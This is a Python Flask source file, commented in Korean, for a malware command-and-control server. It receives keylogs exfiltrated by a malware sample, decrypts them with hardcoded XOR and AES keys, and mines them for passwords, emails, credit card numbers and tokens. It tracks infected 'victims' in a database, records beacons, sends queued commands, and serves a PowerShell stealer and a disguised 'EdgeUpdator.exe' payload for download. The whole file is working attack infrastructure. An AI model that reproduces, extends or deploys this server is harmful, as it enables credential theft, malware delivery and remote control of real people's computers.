## routes/c2.py
"""
C2 전용 라우트 모듈 (키로그 복호화, UUID 추적, 파싱 기능 추가)
"""

from flask import Blueprint, request, jsonify, send_file, current_app
import os
import json
import logging
import re
from datetime import datetime
import hashlib

c2_bp = Blueprint('c2', __name__)

# 데이터 저장 파일들
BEACON_LOG_FILE = 'logs/beacon_log.json'
COMMAND_LOG_FILE = 'logs/command_log.json'
EXFIL_LOG_FILE = 'logs/exfil_log.json'
VICTIMS_DB_FILE = 'logs/victims_db.json'  # 피해자 DB

def load_json_log(filepath):
    """JSON 로그 파일 로드"""
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logging.error(f"로그 로드 실패 {filepath}: {e}")
    return []

def save_json_log(filepath, data):
    """JSON 로그 파일 저장"""
    try:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logging.error(f"로그 저장 실패 {filepath}: {e}")

# ═══════════════════════════════════════════════════════════
# 1. 키로그 데이터 복호화 기능 추가
# ═══════════════════════════════════════════════════════════

def decrypt_keylog_data(encrypted_data):
    """키로그 XOR 복호화 (malkey 키 사용)"""
    try:
        key = "malkey"
        if isinstance(encrypted_data, str):
            encrypted_data = encrypted_data.encode('latin-1')
        
        decrypted = bytearray()
        for i, byte in enumerate(encrypted_data):
            decrypted.append(byte ^ ord(key[i % len(key)]))
        
        result = decrypted.decode('utf-8', errors='ignore')
        logging.info(f"키로그 복호화 성공: {len(result)} 문자")
        return result
        
    except Exception as e:
        logging.error(f"키로그 복호화 실패: {e}")
        return f"[복호화 실패] 원본 데이터: {str(encrypted_data)[:200]}..."

def decrypt_keylog_blocks(file_content):
    """12바이트 블록 단위 키로그 복호화"""
    try:
        key = "malkey"
        decrypted_blocks = []
        
        # 12바이트씩 처리
        for i in range(0, len(file_content), 12):
            block = file_content[i:i+12]
            if len(block) == 0:
                break
                
            decrypted_block = bytearray()
            for j, byte in enumerate(block):
                decrypted_block.append(byte ^ ord(key[j % len(key)]))
            
            # null 패딩 제거
            decrypted_text = decrypted_block.rstrip(b'\x00').decode('utf-8', errors='ignore')
            if decrypted_text:
                decrypted_blocks.append(decrypted_text)
        
        result = ''.join(decrypted_blocks)
        logging.info(f"블록 단위 복호화 성공: {len(decrypted_blocks)} 블록, {len(result)} 문자")
        return result
        
    except Exception as e:
        logging.error(f"블록 단위 복호화 실패: {e}")
        return decrypt_keylog_data(file_content)  

# ═══════════════════════════════════════════════════════════
# 3. 키로그 내용 파싱 기능 추가
# ═══════════════════════════════════════════════════════════

def parse_keylog_content(keylog_text):
    """키로그 내용 분석 및 중요 정보 추출"""
    try:
        parsed_data = {
            'passwords': [],
            'emails': [],
            'credit_cards': [],
            'websites': [],
            'commands': [],
            'sensitive_patterns': [],
            'statistics': {
                'total_chars': len(keylog_text),
                'total_words': len(keylog_text.split()),
                'special_keys': 0,
                'potential_passwords': 0
            }
        }
        
        # 1. 이메일 주소 추출
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, keylog_text)
        parsed_data['emails'] = list(set(emails))
        
        # 2. 신용카드 번호 패턴 (16자리 숫자)
        cc_pattern = r'\b(?:\d{4}[-\s]?){3}\d{4}\b'
        credit_cards = re.findall(cc_pattern, keylog_text)
        parsed_data['credit_cards'] = list(set(credit_cards))
        
        # 3. 웹사이트 URL 추출
        url_pattern = r'https?://[^\s\[\]<>"]+'
        websites = re.findall(url_pattern, keylog_text)
        parsed_data['websites'] = list(set(websites))
        
        # 4. 패스워드 패턴 분석 (Tab 전후 문자열)
        password_pattern = r'([^\[\]\s]{3,20})\[Tab\]([^\[\]\s]{3,20})'
        password_matches = re.findall(password_pattern, keylog_text)
        for username, password in password_matches:
            if len(password) >= 4:  # 최소 4자리 패스워드
                parsed_data['passwords'].append({
                    'username': username,
                    'password': password,
                    'context': f"{username}[Tab]{password}"
                })
        
        # 5. 명령어 실행 패턴
        command_patterns = [
            r'cmd[.\s]*([^\[\]\r\n]+)',
            r'powershell[.\s]*([^\[\]\r\n]+)',
            r'C:\\[^>]*>([^\[\]\r\n]+)'
        ]
        for pattern in command_patterns:
            commands = re.findall(pattern, keylog_text, re.IGNORECASE)
            parsed_data['commands'].extend(commands)
        
        # 6. 민감한 키워드 패턴
        sensitive_keywords = ['password', 'passwd', 'login', 'admin', 'root', 'secret', 'token', 'api_key', 'private']
        for keyword in sensitive_keywords:
            pattern = rf'{keyword}[:\s=]*([^\[\]\s\r\n]{{3,20}})'
            matches = re.findall(pattern, keylog_text, re.IGNORECASE)
            for match in matches:
                parsed_data['sensitive_patterns'].append({
                    'keyword': keyword,
                    'value': match
                })
        
        # 7. 통계 계산
        parsed_data['statistics']['special_keys'] = len(re.findall(r'\[[^\]]+\]', keylog_text))
        parsed_data['statistics']['potential_passwords'] = len(parsed_data['passwords'])
        
        logging.info(f"키로그 파싱 완료: 이메일 {len(parsed_data['emails'])}개, 패스워드 {len(parsed_data['passwords'])}개")
        return parsed_data
        
    except Exception as e:
        logging.error(f"키로그 파싱 실패: {e}")
        return {
            'error': str(e),
            'raw_preview': keylog_text[:500] if keylog_text else 'No data'
        }

# ═══════════════════════════════════════════════════════════
# 4. UUID 기반 피해자 식별 시스템 추가
# ═══════════════════════════════════════════════════════════

def load_victims_db():
    """피해자 데이터베이스 로드"""
    try:
        if os.path.exists(VICTIMS_DB_FILE):
            with open(VICTIMS_DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logging.error(f"피해자 DB 로드 실패: {e}")
    return {}

def save_victims_db(victims_db):
    """피해자 데이터베이스 저장"""
    try:
        os.makedirs(os.path.dirname(VICTIMS_DB_FILE), exist_ok=True)
        with open(VICTIMS_DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(victims_db, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logging.error(f"피해자 DB 저장 실패: {e}")

def parse_uuid(uuid_string):
    """UUID에서 컴퓨터명과 IP 추출"""
    try:
        if '_' in uuid_string:
            parts = uuid_string.split('_')
            computer_name = parts[0]
            ip_address = parts[1] if len(parts) > 1 else 'unknown'
            return computer_name, ip_address
        else:
            return uuid_string, 'unknown'
    except Exception:
        return 'unknown', 'unknown'

def update_victim_info(victim_id, client_ip, data_type, additional_info=None):
    """피해자 정보 업데이트"""
    try:
        victims_db = load_victims_db()
        current_time = datetime.now().isoformat()
        
        # UUID에서 정보 추출
        computer_name, uuid_ip = parse_uuid(victim_id)
        
        if victim_id not in victims_db:
            victims_db[victim_id] = {
                'victim_id': victim_id,
                'computer_name': computer_name,
                'uuid_ip': uuid_ip,
                'client_ip': client_ip,
                'first_seen': current_time,
                'last_activity': current_time,
                'activity_count': 0,
                'data_types': [],
                'total_data_size': 0,
                'status': 'active',
                'keylog_sessions': 0,
                'beacon_count': 0,
                'command_count': 0,
                'extracted_info': {
                    'passwords': [],
                    'emails': [],
                    'websites': []
                }
            }
            logging.info(f"새 피해자 등록: {victim_id} ({computer_name})")
        
        # 기존 피해자 정보 업데이트
        victim = victims_db[victim_id]
        victim['last_activity'] = current_time
        victim['activity_count'] += 1
        victim['client_ip'] = client_ip  # 최신 IP로 업데이트
        
        # 데이터 타입별 카운트
        if data_type not in victim['data_types']:
            victim['data_types'].append(data_type)
            
        if data_type == 'keylog':
            victim['keylog_sessions'] += 1
        elif data_type == 'beacon':
            victim['beacon_count'] += 1
        elif data_type == 'command':
            victim['command_count'] += 1
        
        # 추가 정보 업데이트
        if additional_info:
            if 'file_size' in additional_info:
                victim['total_data_size'] += additional_info['file_size']
            
            if 'parsed_keylog' in additional_info:
                parsed = additional_info['parsed_keylog']
                if 'passwords' in parsed:
                    for pwd in parsed['passwords']:
                        if pwd not in victim['extracted_info']['passwords']:
                            victim['extracted_info']['passwords'].append(pwd)
                if 'emails' in parsed:
                    for email in parsed['emails']:
                        if email not in victim['extracted_info']['emails']:
                            victim['extracted_info']['emails'].append(email)
                if 'websites' in parsed:
                    for website in parsed['websites']:
                        if website not in victim['extracted_info']['websites']:
                            victim['extracted_info']['websites'].append(website)
        
        save_victims_db(victims_db)
        return victim
        
    except Exception as e:
        logging.error(f"피해자 정보 업데이트 실패: {e}")
        return None

def get_victim_summary():
    """피해자 요약 통계"""
    try:
        victims_db = load_victims_db()
        now = datetime.now()
        
        summary = {
            'total_victims': len(victims_db),
            'active_victims': 0,
            'total_passwords': 0,
            'total_emails': 0,
            'total_data_size': 0,
            'recent_activity': []
        }
        
        for victim_id, victim in victims_db.items():
            # 24시간 이내 활동을 active로 간주
            try:
                last_activity = datetime.fromisoformat(victim['last_activity'])
                if (now - last_activity).total_seconds() < 86400:  # 24시간
                    summary['active_victims'] += 1
            except:
                pass
            
            summary['total_passwords'] += len(victim['extracted_info']['passwords'])
            summary['total_emails'] += len(victim['extracted_info']['emails'])
            summary['total_data_size'] += victim.get('total_data_size', 0)
            
            # 최근 활동 (상위 10개)
            summary['recent_activity'].append({
                'victim_id': victim_id,
                'computer_name': victim['computer_name'],
                'last_activity': victim['last_activity'],
                'activity_count': victim['activity_count']
            })
        
        # 최근 활동순 정렬
        summary['recent_activity'].sort(key=lambda x: x['last_activity'], reverse=True)
        summary['recent_activity'] = summary['recent_activity'][:10]
        
        return summary
        
    except Exception as e:
        logging.error(f"피해자 요약 통계 실패: {e}")
        return {}

# ═══════════════════════════════════════════════════════════
# 실시간 브로드캐스트 헬퍼 함수
# ═══════════════════════════════════════════════════════════

def broadcast_data(data_type, data):
    """실시간 데이터 브로드캐스트"""
    try:
        if hasattr(current_app, 'broadcast_realtime_data'):
            success = current_app.broadcast_realtime_data(data_type, data)
            if success:
                print(f"[C2] 실시간 데이터 전송 성공: {data_type}")
            else:
                print(f"[C2] 실시간 데이터 전송 실패: {data_type}")
        else:
            print(f"[C2] 브로드캐스트 함수 없음")
    except Exception as e:
        logging.error(f"브로드캐스트 오류: {e}")

# ═══════════════════════════════════════════════════════════
# 2. 파일 업로드 방식 매칭 문제 해결
# ═══════════════════════════════════════════════════════════

@c2_bp.route('/exfil', methods=['POST'])
def receive_exfiltration():
    """키로그/파일 데이터 수신 - 수정된 버전"""
    try:
        logging.info(f"POST /exfil 요청 수신")
        logging.info(f"Content-Type: {request.content_type}")
        logging.info(f"Content-Length: {request.content_length}")
        
        victim_id = 'unknown'
        data_type = 'keylog'
        file_content = None
        filename = None
        
        # ← 수정: Raw POST body 처리 추가 (악성코드 방식)
        if request.content_type == 'application/octet-stream':
            logging.info("Raw 옥텟 스트림 데이터 수신")
            file_content = request.get_data()
            
            # User-Agent에서 피해자 정보 추출 시도
            user_agent = request.headers.get('User-Agent', '')
            if 'BadCat Brings Gift Here' in user_agent:
                # 악성코드에서 전송한 데이터
                victim_id = f"malware_{request.remote_addr.replace('.', '_')}"
                data_type = 'keylog'
                filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tmp"
            else:
                victim_id = f"unknown_{request.remote_addr.replace('.', '_')}"
                filename = f"data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
                
        # 기존 multipart/form-data 처리
        elif 'file' in request.files and request.files['file'].filename:
            file = request.files['file']
            filename = f"{victim_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file.filename}"
            file_content = file.read()
            victim_id = request.form.get('victim_id', f"upload_{request.remote_addr.replace('.', '_')}")
            data_type = request.form.get('data_type', 'file_upload')
            
        # 텍스트 데이터 처리
        elif request.form.get('data'):
            data_content = request.form.get('data')
            victim_id = request.form.get('victim_id', f"text_{request.remote_addr.replace('.', '_')}")
            data_type = request.form.get('data_type', 'text_data')
            filename = f"{victim_id}_{data_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            file_content = data_content.encode('utf-8')
            
        else:
            logging.error("전송할 데이터가 없음")
            return jsonify({'error': '전송할 데이터가 없습니다'}), 400
        
        if not file_content:
            logging.error("파일 내용이 비어있음")
            return jsonify({'error': '파일 내용이 없습니다'}), 400
        
        # 키로그 데이터 복호화 및 파싱
        decrypted_content = None
        parsed_keylog = None
        
        if data_type == 'keylog' and file_content:
            logging.info("키로그 데이터 복호화 시작")
            decrypted_content = decrypt_keylog_blocks(file_content)
            
            if decrypted_content:
                logging.info("키로그 내용 파싱 시작")
                parsed_keylog = parse_keylog_content(decrypted_content)
                logging.info(f"파싱 결과: 패스워드 {len(parsed_keylog.get('passwords', []))}개")
        
        # 파일 저장
        save_path = os.path.join('uploads', 'exfil', filename)
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        
        with open(save_path, 'wb') as f:
            f.write(file_content)
        
        # 복호화된 내용도 별도 저장
        if decrypted_content:
            decrypted_path = save_path.replace('.tmp', '_decrypted.txt').replace('.bin', '_decrypted.txt')
            with open(decrypted_path, 'w', encoding='utf-8') as f:
                f.write(decrypted_content)
                
            # 파싱 결과도 JSON으로 저장
            if parsed_keylog:
                parsed_path = save_path.replace('.tmp', '_parsed.json').replace('.bin', '_parsed.json')
                with open(parsed_path, 'w', encoding='utf-8') as f:
                    json.dump(parsed_keylog, f, ensure_ascii=False, indent=2)
        
        # 피해자 정보 업데이트
        victim_info = update_victim_info(
            victim_id, 
            request.remote_addr, 
            data_type,
            {
                'file_size': len(file_content),
                'parsed_keylog': parsed_keylog
            }
        )
        
        # 로그 엔트리 생성
        exfil_entry = {
            'id': datetime.now().strftime('%Y%m%d_%H%M%S_%f'),
            'victim_id': victim_id,
            'data_type': data_type,
            'filename': filename,
            'file_size': len(file_content),
            'client_ip': request.remote_addr,
            'timestamp': datetime.now().isoformat(),
            'has_decrypted': decrypted_content is not None,
            'has_parsed': parsed_keylog is not None,
            'decrypted_preview': decrypted_content[:200] if decrypted_content else None,
            'parsed_summary': {
                'passwords_count': len(parsed_keylog.get('passwords', [])) if parsed_keylog else 0,
                'emails_count': len(parsed_keylog.get('emails', [])) if parsed_keylog else 0,
                'websites_count': len(parsed_keylog.get('websites', [])) if parsed_keylog else 0
            } if parsed_keylog else None
        }
        
        # 파일에 저장
        exfil_log = load_json_log(EXFIL_LOG_FILE)
        exfil_log.append(exfil_entry)
        exfil_log = exfil_log[-1000:]
        save_json_log(EXFIL_LOG_FILE, exfil_log)
        
        # 실시간 브로드캐스트
        broadcast_data('exfiltration', exfil_entry)
        
        logging.info(f"📤 데이터 유출 수신: {data_type} from {victim_id} ({len(file_content)} bytes)")
        if parsed_keylog:
            logging.info(f"🔍 파싱 완료: 패스워드 {len(parsed_keylog.get('passwords', []))}개, 이메일 {len(parsed_keylog.get('emails', []))}개")
        
        return jsonify({
            'status': 'success',
            'message': 'data received and processed',
            'filename': filename,
            'victim_id': victim_id,
            'decrypted': decrypted_content is not None,
            'parsed': parsed_keylog is not None
        })
        
    except Exception as e:
        logging.error(f"데이터 유출 수신 오류: {e}")
        return jsonify({'error': '데이터 처리 실패'}), 500

# ═══════════════════════════════════════════════════════════
# 비콘 핸들러 (UUID 처리 개선)
# ═══════════════════════════════════════════════════════════

@c2_bp.route('/beacon', methods=['GET', 'POST'])
def receive_beacon():
    """악성코드 생존 신호 수신 - UUID 처리 개선"""
    try:
        # GET 방식 (악성코드에서 사용)
        if request.method == 'GET':
            victim_uuid = request.args.get('uuid', 'unknown')
            data = {
                'victim_id': victim_uuid,
                'status': 'alive',
                'method': 'GET'
            }
        # POST 방식 (호환성)
        else:
            if request.content_type and 'application/json' in request.content_type:
                data = request.get_json()
            else:
                data = {
                    'victim_id': request.form.get('victim_id', 'unknown'),
                    'status': request.form.get('status', 'alive'),
                    'method': 'POST'
                }
        
        victim_id = data.get('victim_id', 'unknown')
        
        beacon_entry = {
            'id': datetime.now().strftime('%Y%m%d_%H%M%S_%f'),
            'victim_id': victim_id,
            'status': data.get('status', 'alive'),
            'client_ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'timestamp': datetime.now().isoformat(),
            'method': data.get('method', 'unknown'),
            'received_data': data
        }
        
        # 피해자 정보 업데이트
        update_victim_info(victim_id, request.remote_addr, 'beacon')
        
        # 파일에 저장
        beacon_log = load_json_log(BEACON_LOG_FILE)
        beacon_log.append(beacon_entry)
        beacon_log = beacon_log[-500:]
        save_json_log(BEACON_LOG_FILE, beacon_log)
        
        # 실시간 브로드캐스트
        broadcast_data('beacon', beacon_entry)
        
        logging.info(f"📡 비콘 신호 수신: {victim_id} from {request.remote_addr}")
        
        return jsonify({
            'status': 'success',
            'message': 'beacon received',
            'next_check': 60
        })
        
    except Exception as e:
        logging.error(f"비콘 수신 오류: {e}")
        return jsonify({'error': '비콘 처리 실패'}), 500

# ═══════════════════════════════════════════════════════════
# 새로운 API 엔드포인트들
# ═══════════════════════════════════════════════════════════

@c2_bp.route('/api/victims')
def get_victims():
    """피해자 목록 조회"""
    try:
        victims_db = load_victims_db()
        summary = get_victim_summary()
        
        return jsonify({
            'summary': summary,
            'victims': list(victims_db.values())
        })
    except Exception as e:
        logging.error(f"피해자 목록 조회 오류: {e}")
        return jsonify({'error': '피해자 목록 조회 실패'}), 500

@c2_bp.route('/api/victims/<victim_id>')
def get_victim_detail(victim_id):
    """특정 피해자 상세 정보"""
    try:
        victims_db = load_victims_db()
        
        if victim_id not in victims_db:
            return jsonify({'error': '피해자를 찾을 수 없습니다'}), 404
        
        return jsonify(victims_db[victim_id])
    except Exception as e:
        logging.error(f"피해자 상세 조회 오류: {e}")
        return jsonify({'error': '피해자 상세 조회 실패'}), 500

@c2_bp.route('/api/keylog/<data_id>')
def get_keylog_analysis(data_id):
    """키로그 분석 결과 조회"""
    try:
        # 파싱된 JSON 파일 찾기
        exfil_log = load_json_log(EXFIL_LOG_FILE)
        target_entry = None
        
        for entry in exfil_log:
            if entry['id'] == data_id:
                target_entry = entry
                break
        
        if not target_entry:
            return jsonify({'error': '키로그 데이터를 찾을 수 없습니다'}), 404
        
        # 파싱된 파일 로드
        parsed_path = os.path.join('uploads', 'exfil', target_entry['filename'].replace('.tmp', '_parsed.json'))
        decrypted_path = os.path.join('uploads', 'exfil', target_entry['filename'].replace('.tmp', '_decrypted.txt'))
        
        result = {
            'basic_info': target_entry,
            'parsed_data': None,
            'decrypted_content': None
        }
        
        if os.path.exists(parsed_path):
            with open(parsed_path, 'r', encoding='utf-8') as f:
                result['parsed_data'] = json.load(f)
        
        if os.path.exists(decrypted_path):
            with open(decrypted_path, 'r', encoding='utf-8') as f:
                result['decrypted_content'] = f.read()
        
        return jsonify(result)
        
    except Exception as e:
        logging.error(f"키로그 분석 조회 오류: {e}")
        return jsonify({'error': '키로그 분석 조회 실패'}), 500

# 기존 엔드포인트들 (변경 없음)
@c2_bp.route('/download')
def download_payload():
    """페이로드 다운로드"""
    try:
        file_type = request.args.get('f')
        
        if file_type == 'powershell':
            script_path = os.path.join('downloads', 'stealer.ps1')
            if os.path.exists(script_path):
                logging.info("📜 PowerShell 스크립트 전송")
                return send_file(script_path, 
                               mimetype='text/plain',
                               as_attachment=True,
                               download_name='script.ps1')
            else:
                return jsonify({'error': 'PowerShell 스크립트를 찾을 수 없습니다'}), 404
                
        elif file_type == 'exe':
            exe_path = os.path.join('downloads', 'EdgeUpdator.exe')
            if os.path.exists(exe_path):
                logging.info("🦠 악성코드 exe 전송")
                return send_file(exe_path,
                               mimetype='application/octet-stream',
                               as_attachment=True,
                               download_name='update.exe')
            else:
                calc_path = r"C:\Windows\System32\calc.exe"
                if os.path.exists(calc_path):
                    logging.warning("⚠️ 테스트용 계산기 전송")
                    return send_file(calc_path,
                                   mimetype='application/octet-stream',
                                   as_attachment=True,
                                   download_name='update.exe')
                return jsonify({'error': '실행파일을 찾을 수 없습니다'}), 404
        else:
            return jsonify({'error': '잘못된 파일 타입입니다. f=powershell 또는 f=exe'}), 400
            
    except Exception as e:
        logging.error(f"다운로드 오류: {e}")
        return jsonify({'error': '다운로드 실패'}), 500

@c2_bp.route('/command', methods=['GET', 'POST'])
def handle_command():
    """명령 전송/수신 - 실시간 업데이트 추가"""
    if request.method == 'GET':
        try:
            victim_id = request.args.get('victim_id', 'unknown')
            
            pending_commands = [
                {'cmd': 'dir C:\\Users', 'id': 'cmd_001'},
                {'cmd': 'whoami', 'id': 'cmd_002'}
            ]
            
            if pending_commands:
                command = pending_commands[0]
                logging.info(f"💻 명령 전송: {command['cmd']} to {victim_id}")
                return jsonify(command)
            else:
                return jsonify({'cmd': None, 'message': 'no pending commands'})
                
        except Exception as e:
            logging.error(f"명령 전송 오류: {e}")
            return jsonify({'error': '명령 전송 실패'}), 500
    
    elif request.method == 'POST':
        try:
            if request.content_type and 'application/json' in request.content_type:
                data = request.get_json()
            else:
                data = {
                    'victim_id': request.form.get('victim_id', 'unknown'),
                    'command_id': request.form.get('command_id', ''),
                    'command': request.form.get('command', ''),
                    'result': request.form.get('result', ''),
                    'exit_code': request.form.get('exit_code', '0')
                }
            
            victim_id = data.get('victim_id')
            
            command_entry = {
                'id': datetime.now().strftime('%Y%m%d_%H%M%S_%f'),
                'victim_id': victim_id,
                'command_id': data.get('command_id'),
                'command': data.get('command'),
                'result': data.get('result'),
                'exit_code': data.get('exit_code'),
                'client_ip': request.remote_addr,
                'timestamp': datetime.now().isoformat()
            }
            
            # 피해자 정보 업데이트
            update_victim_info(victim_id, request.remote_addr, 'command')
            
            # 파일에 저장
            command_log = load_json_log(COMMAND_LOG_FILE)
            command_log.append(command_entry)
            command_log = command_log[-200:]
            save_json_log(COMMAND_LOG_FILE, command_log)
            
            # 실시간 브로드캐스트
            broadcast_data('command', command_entry)
            
            logging.info(f"💻 명령 결과 수신: {data.get('command')} from {victim_id}")
            
            return jsonify({'status': 'success', 'message': 'command result received'})
            
        except Exception as e:
            logging.error(f"명령 결과 수신 오류: {e}")
            return jsonify({'error': '명령 결과 처리 실패'}), 500

@c2_bp.route('/status')
def get_status():
    """감염 현황 확인 - 피해자 DB 통합"""
    try:
        victims_summary = get_victim_summary()
        beacon_log = load_json_log(BEACON_LOG_FILE)
        command_log = load_json_log(COMMAND_LOG_FILE)
        exfil_log = load_json_log(EXFIL_LOG_FILE)
        
        status_data = {
            'total_victims': victims_summary.get('total_victims', 0),
            'active_victims': victims_summary.get('active_victims', 0),
            'total_passwords': victims_summary.get('total_passwords', 0),
            'total_emails': victims_summary.get('total_emails', 0),
            'total_data_size': victims_summary.get('total_data_size', 0),
            'total_beacons': len(beacon_log),
            'total_commands': len(command_log),
            'total_exfiltrations': len(exfil_log),
            'server_status': 'online',
            'last_activity': beacon_log[-1]['timestamp'] if beacon_log else None,
            'recent_activity': victims_summary.get('recent_activity', [])
        }
        
        return jsonify(status_data)
        
    except Exception as e:
        logging.error(f"상태 조회 오류: {e}")
        return jsonify({'error': '상태 조회 실패'}), 500

# API 데이터 조회 엔드포인트들 (기존 유지)
@c2_bp.route('/beacons')
def get_beacons():
    """비콘 로그 조회"""
    try:
        beacon_log = load_json_log(BEACON_LOG_FILE)
        return jsonify({
            'total': len(beacon_log),
            'recent_20': beacon_log[-20:] if beacon_log else []
        })
    except Exception as e:
        return jsonify({'error': '비콘 로그 조회 실패'}), 500

@c2_bp.route('/commands')
def get_commands():
    """명령 로그 조회"""
    try:
        command_log = load_json_log(COMMAND_LOG_FILE)
        return jsonify({
            'total': len(command_log),
            'recent_20': command_log[-20:] if command_log else []
        })
    except Exception as e:
        return jsonify({'error': '명령 로그 조회 실패'}), 500

@c2_bp.route('/api/exfiltrations')
def get_exfiltrations():
    """유출 데이터 조회"""
    try:
        exfil_log = load_json_log(EXFIL_LOG_FILE)
        return jsonify({
            'total': len(exfil_log),
            'recent_20': exfil_log[-20:] if exfil_log else []
        })
    except Exception as e:
        return jsonify({'error': '유출 데이터 조회 실패'}), 500

@c2_bp.route('/api/exfiltrations/detail/<data_id>')
def get_exfiltration_detail(data_id):
    """유출 데이터 상세 조회"""
    try:
        exfil_log = load_json_log(EXFIL_LOG_FILE)
        for item in exfil_log:
            if item['id'] == data_id:
                return jsonify(item)
        return jsonify({'error': '데이터를 찾을 수 없습니다'}), 404
    except Exception as e:
        return jsonify({'error': '데이터 조회 실패'}), 500

# 파워쉘 전용 라우트 (기존 유지)
@c2_bp.route('/report', methods=['POST'])
def receive_powershell_report():
    """파워쉘에서 수집한 암호화 데이터 수신"""
    try:
        encrypted_data = request.form.get('data')
        
        if not encrypted_data:
            logging.error("파워쉘 데이터가 없음")
            return "ERROR: No data", 400
        
        # AES 복호화 시도
        decrypted_data = decrypt_powershell_data(encrypted_data)
        
        victim_id = f"powershell_{request.remote_addr.replace('.', '_')}"
        
        exfil_entry = {
            'id': datetime.now().strftime('%Y%m%d_%H%M%S_%f'),
            'victim_id': victim_id,
            'data_type': 'powershell_encrypted',
            'filename': f"powershell_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            'file_size': len(encrypted_data),
            'client_ip': request.remote_addr,
            'timestamp': datetime.now().isoformat(),
            'encrypted_data': encrypted_data,
            'decrypted_data': decrypted_data,
            'raw_data': encrypted_data
        }
        
        # 피해자 정보 업데이트
        update_victim_info(victim_id, request.remote_addr, 'powershell', {
            'file_size': len(encrypted_data)
        })
        
        # 파일로 저장
        save_path = os.path.join('uploads', 'exfil', exfil_entry['filename'])
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        with open(save_path, 'w', encoding='utf-8') as f:
            f.write(f"=== 암호화된 데이터 ===\n{encrypted_data}\n\n")
            f.write(f"=== 복호화된 데이터 ===\n{decrypted_data}\n")
        
        # exfil 로그에 추가
        exfil_log = load_json_log(EXFIL_LOG_FILE)
        exfil_log.append(exfil_entry)
        exfil_log = exfil_log[-1000:]
        save_json_log(EXFIL_LOG_FILE, exfil_log)
        
        # 실시간 브로드캐스트
        broadcast_data('powershell', exfil_entry)
        
        logging.info(f"📊 파워쉘 암호화 데이터 수신: {request.remote_addr} - 크기: {len(encrypted_data)} bytes")
        
        return "OK", 200
        
    except Exception as e:
        logging.error(f"파워쉘 데이터 수신 오류: {e}")
        return "ERROR", 500

def decrypt_powershell_data(encrypted_data):
    """파워쉘 AES 데이터 복호화"""
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        import base64
        
        key_str = "ZGFuZ2VyIG9mIHR5cG9zIQ=="
        iv_str = "aGRmbGFiaGFoYXdlbGNvbWU="
        
        key = base64.b64decode(key_str)[:16]
        iv = base64.b64decode(iv_str)[:16]
        
        encrypted_bytes = base64.b64decode(encrypted_data)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
        decrypted_text = decrypted_bytes.decode('utf-8')
        
        parsed_data = json.loads(decrypted_text)
        return json.dumps(parsed_data, ensure_ascii=False, indent=2)
        
    except Exception as e:
        logging.error(f"복호화 실패: {e}")
        return f"복호화 실패: {encrypted_data[:100]}..."

@c2_bp.route('/report/EdgeUpdator.exe', methods=['GET'])
def serve_malicious_exe_legacy():
    """악성코드 파일 전송 (레거시 호환)"""
    try:
        exe_path = os.path.join('downloads', 'EdgeUpdator.exe')
        
        if not os.path.exists(exe_path):
            calc_path = r"C:\Windows\System32\calc.exe"
            if os.path.exists(calc_path):
                logging.warning("⚠️ 레거시: 실제 악성코드가 없어서 계산기로 대체")
                return send_file(calc_path, 
                               mimetype='application/octet-stream', 
                               as_attachment=True, 
                               download_name='EdgeUpdator.exe')
            else:
                return jsonify({'error': '악성코드 파일을 찾을 수 없습니다'}), 404
        
        logging.info("🦠 레거시: 악성코드 파일 전송")
        return send_file(exe_path, 
                        mimetype='application/octet-stream', 
                        as_attachment=True, 
                        download_name='EdgeUpdator.exe')
        
    except Exception as e:
        logging.error(f"레거시 악성코드 파일 전송 오류: {e}")
        return jsonify({'error': '파일 전송 실패'}), 500
